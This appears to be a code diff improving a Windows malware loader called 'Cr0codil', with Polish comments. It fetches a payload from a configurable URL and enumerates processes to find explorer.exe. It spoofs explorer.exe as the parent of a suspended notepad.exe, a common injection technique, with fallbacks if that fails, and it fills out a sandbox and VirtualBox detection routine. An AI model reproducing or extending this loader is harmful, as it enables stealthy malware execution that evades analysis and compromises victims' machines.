@@ -1,4 +1,4 @@
-// Cr0codil.cpp : Ulepszona wersja z dynamicznym rozmiarem payloadu i konfigurowalnym URL
+// Cr0codil.cpp : Ulepszona wersja z dynamicznym rozmiarem payloadu, konfigurowalnym URL i obsługą błędów
 //
 
 #include <iostream>
@@ -12,6 +12,7 @@
 #include <vector>
 #include <string>
 #include <cctype>
+#include <sddl.h>       // dla ConvertSidToStringSidA (opcjonalnie)
 
 #pragma comment(lib, "Winhttp.lib")
 #pragma comment(lib, "IPHlpApi.lib")
@@ -37,6 +38,7 @@
 
 bool dynamicAnalysisCheck();
 std::string GetConfigUrl(int argc, char* argv[]);
+bool IsRunningAsAdmin();
 
 int main(int argc, char* argv[])
 {
@@ -44,6 +46,13 @@ int main(int argc, char* argv[])
     LOG("Command line arguments: %d", argc);
     for (int i = 0; i < argc; i++) {
         LOG("  argv[%d] = '%s'", i, argv[i]);
+    }
+
+    // Sprawdzenie uprawnień administratora
+    if (IsRunningAsAdmin()) {
+        LOG("Program is running with administrator privileges.");
+    } else {
+        LOG("WARNING: Program is NOT running as administrator. Some operations may fail.");
     }
 
     // ---------- Pobranie URL payloadu ----------
@@ -123,19 +132,16 @@ int main(int argc, char* argv[])
     LOG("EnumProcesses returned %d processes (%d bytes)", runningProcessesCount, runningProcessesCountBytes);
 
     int processChecked = 0;
+    DWORD explorerPid = 0;
     for (DWORD i = 0; i < runningProcessesCount; i++) {
         if (runningProcessesIDs[i] != 0) {
             processChecked++;
             HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
-            if (!hProcess) {
-                // LOG("  PID %d: Cannot open process (error %d)", runningProcessesIDs[i], GetLastError());
-                continue;
-            }
+            if (!hProcess) continue;
 
             char processName[MAX_PATH + 1];
             DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
             if (size == 0) {
-                // LOG("  PID %d: Cannot get process name (error %d)", runningProcessesIDs[i], GetLastError());
                 CloseHandle(hProcess);
                 continue;
             }
@@ -144,12 +150,10 @@ int main(int argc, char* argv[])
             
             if (strstr(processName, "explorer.exe")) {
                 LOG("  PID %d: Found explorer.exe at %s", runningProcessesIDs[i], processName);
-                if (hExplorerexe) {
-                    LOG("  Closing previous explorer.exe handle");
-                    CloseHandle(hExplorerexe);
-                }
+                explorerPid = runningProcessesIDs[i];
+                if (hExplorerexe) CloseHandle(hExplorerexe);
                 hExplorerexe = hProcess;
-                break;  // Znaleźliśmy, można przerwać
+                break;
             } else {
                 CloseHandle(hProcess);
             }
@@ -158,15 +162,30 @@ int main(int argc, char* argv[])
     
     LOG("Process enumeration complete. Checked %d processes", processChecked);
     if (hExplorerexe) {
-        LOG("Successfully obtained explorer.exe handle: 0x%p", hExplorerexe);
+        LOG("Successfully obtained explorer.exe handle: 0x%p (PID: %d)", hExplorerexe, explorerPid);
+        
+        // Sprawdź, czy handle ma odpowiednie uprawnienia
+        DWORD accessFlags = 0;
+        if (GetHandleInformation(hExplorerexe, &accessFlags)) {
+            LOG("Handle flags: 0x%08X", accessFlags);
+        }
+        
+        // Spróbuj otworzyć silniejszy handle z PROCESS_CREATE_PROCESS
+        HANDLE hStrong = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
+                                     FALSE, explorerPid);
+        if (hStrong) {
+            LOG("Opened stronger handle to explorer.exe with PROCESS_CREATE_PROCESS: 0x%p", hStrong);
+            CloseHandle(hExplorerexe);
+            hExplorerexe = hStrong;
+        } else {
+            LOG("WARNING: Could not obtain PROCESS_CREATE_PROCESS access to explorer.exe (error %d). Parent process attribute may fail.", GetLastError());
+        }
     } else {
         LOG("WARNING: Could not find explorer.exe process. Will create process without parent.");
     }
 
     // Opcjonalne sprawdzenia anty-debug/VM (zakomentowane)
     LOG("Step 6: Anti-debug/VM checks are disabled");
-    // bool checkStatus = dynamicAnalysisCheck();
-    // if (IsDebuggerPresent() && !checkStatus) { ... }
 
     // ---------- Blok wykonawczy z czyszczeniem ----------
     LOG("Step 7: Creating notepad.exe process...");
@@ -177,47 +196,113 @@ int main(int argc, char* argv[])
     STARTUPINFOEXA si = { 0 };
     SIZE_T payloadSize = 0;
     DWORD oldProtect = 0;
+    bool useExtendedAttributes = true;  // flaga określająca, czy używać EXTENDED_STARTUPINFO
 
     do {
         RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
         RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
-        LOG("  Initializing PROC_THREAD_ATTRIBUTE_LIST...");
-        SIZE_T attributeSize;
-        if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize)) {
-            DWORD err = GetLastError();
-            if (err != ERROR_INSUFFICIENT_BUFFER) {  // 122 - to normalne przy pierwszym wywołaniu
-                LOG_ERROR("InitializeProcThreadAttributeList (size query) failed");
-            }
-        }
-        LOG("  Attribute list size: %zu bytes", attributeSize);
-        
-        si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
-        if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
-            LOG_ERROR("InitializeProcThreadAttributeList (init) failed");
-            break;
-        }
-        LOG("  Attribute list initialized successfully");
-        
+        // Przygotowanie atrybutów tylko jeśli mamy handle do rodzica
         if (hExplorerexe) {
-            LOG("  Setting parent process to explorer.exe (handle: 0x%p)", hExplorerexe);
-            if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL)) {
-                LOG_ERROR("UpdateProcThreadAttribute failed");
-                break;
+            LOG("  Initializing PROC_THREAD_ATTRIBUTE_LIST...");
+            SIZE_T attributeSize;
+            if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize)) {
+                DWORD err = GetLastError();
+                if (err != ERROR_INSUFFICIENT_BUFFER) {
+                    LOG_ERROR("InitializeProcThreadAttributeList (size query) failed");
+                }
             }
-            LOG("  Parent process attribute set successfully");
+            LOG("  Attribute list size: %zu bytes", attributeSize);
+            
+            si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
+            if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
+                LOG_ERROR("InitializeProcThreadAttributeList (init) failed");
+                delete[] reinterpret_cast<byte*>(si.lpAttributeList);
+                si.lpAttributeList = NULL;
+                useExtendedAttributes = false;
+                LOG("  Will fall back to standard process creation (no parent)");
+            } else {
+                LOG("  Attribute list initialized successfully");
+                
+                LOG("  Setting parent process to explorer.exe (handle: 0x%p)", hExplorerexe);
+                if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL)) {
+                    LOG_ERROR("UpdateProcThreadAttribute failed");
+                    DeleteProcThreadAttributeList(si.lpAttributeList);
+                    delete[] reinterpret_cast<byte*>(si.lpAttributeList);
+                    si.lpAttributeList = NULL;
+                    useExtendedAttributes = false;
+                    LOG("  Will fall back to standard process creation (no parent)");
+                } else {
+                    LOG("  Parent process attribute set successfully");
+                }
+            }
         } else {
-            LOG("  No parent process specified");
+            useExtendedAttributes = false;
         }
         
-        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+        if (useExtendedAttributes && si.lpAttributeList) {
+            si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+        } else {
+            // Użyj standardowego STARTUPINFO
+            si.StartupInfo.cb = sizeof(STARTUPINFO);
+        }
 
         LOG("  Calling CreateProcessA for notepad.exe...");
-        if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,
-            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
-            &si.StartupInfo, &pi)) {
-            LOG_ERROR("CreateProcessA failed");
-            break;
+        BOOL createResult;
+        DWORD creationFlags = CREATE_SUSPENDED;
+        if (useExtendedAttributes && si.lpAttributeList) {
+            creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
+        }
+        
+        createResult = CreateProcessA(
+            "C:\\Windows\\notepad.exe",
+            NULL,
+            NULL,
+            NULL,
+            FALSE,
+            creationFlags,
+            NULL,
+            NULL,
+            &si.StartupInfo,
+            &pi
+        );
+        
+        if (!createResult) {
+            DWORD err = GetLastError();
+            LOG_ERROR("CreateProcessA failed with error %d", err);
+            
+            // Jeśli błąd dostępu i próbowaliśmy z atrybutami, spróbuj bez
+            if (err == ERROR_ACCESS_DENIED && useExtendedAttributes) {
+                LOG("  Access denied with extended attributes. Trying standard creation...");
+                
+                // Wyczyść atrybuty
+                if (si.lpAttributeList) {
+                    DeleteProcThreadAttributeList(si.lpAttributeList);
+                    delete[] reinterpret_cast<byte*>(si.lpAttributeList);
+                    si.lpAttributeList = NULL;
+                }
+                
+                // Użyj standardowego STARTUPINFO
+                RtlZeroMemory(&si, sizeof(STARTUPINFO));
+                si.StartupInfo.cb = sizeof(STARTUPINFO);
+                
+                createResult = CreateProcessA(
+                    "C:\\Windows\\notepad.exe",
+                    NULL, NULL, NULL, FALSE,
+                    CREATE_SUSPENDED,
+                    NULL, NULL,
+                    &si.StartupInfo,
+                    &pi
+                );
+                
+                if (!createResult) {
+                    LOG_ERROR("Standard CreateProcessA also failed");
+                    break;
+                }
+                LOG("  Standard process creation succeeded.");
+            } else {
+                break;
+            }
         }
 
         LOG("  Process created successfully!");
@@ -312,6 +397,21 @@ int main(int argc, char* argv[])
     return exitCode;
 }
 
+// ---------- Funkcja sprawdzająca uprawnienia administratora ----------
+bool IsRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
+            isAdmin = FALSE;
+        }
+        FreeSid(adminGroup);
+    }
+    return isAdmin != FALSE;
+}
+
 // ---------- Funkcja pobierająca URL ----------
 std::string GetConfigUrl(int argc, char* argv[])
 {
@@ -365,7 +465,7 @@ std::string GetConfigUrl(int argc, char* argv[])
     return fallbackUrl;
 }
 
-// ---------- dynamicAnalysisCheck ----------
+// ---------- dynamicAnalysisCheck (zachowana dla kompletności) ----------
 bool dynamicAnalysisCheck() {
     LOG("Running dynamic analysis checks...");
     
@@ -421,4 +521,38 @@ bool dynamicAnalysisCheck() {
     LOG("  No VirtualBox DLLs found");
 
     // Test połączenia internetowego
-    LOG("  Testing internet connection...
+    LOG("  Testing internet connection...");
+    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) { LOG("  FAIL: WinHttpOpen"); return false; }
+    HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hConnection) { WinHttpCloseHandle(hSession); LOG("  FAIL: WinHttpConnect"); return false; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
+    if (!hRequest) { WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); LOG("  FAIL: WinHttpOpenRequest"); return false; }
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+        !WinHttpReceiveResponse(hRequest, 0)) {
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
+        LOG("  FAIL: Send/Receive"); return false;
+    }
+    DWORD responseLength;
+    if (!WinHttpQueryDataAvailable(hRequest, &responseLength)) {
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
+        LOG("  FAIL: QueryDataAvailable"); return false;
+    }
+    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
+    if (!response) {
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
+        LOG("  FAIL: HeapAlloc"); return false;
+    }
+    if (!WinHttpReadData(hRequest, response, responseLength, &responseLength)) {
+        HeapFree(GetProcessHeap(), 0, response);
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
+        LOG("  FAIL: ReadData"); return false;
+    }
+    if (response) HeapFree(GetProcessHeap(), 0, response);
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnection) WinHttpCloseHandle(hConnection);
+    if (hSession) WinHttpCloseHandle(hSession);
+    
+    LOG("  All dynamic analysis checks passed.");
+    return true;
+}
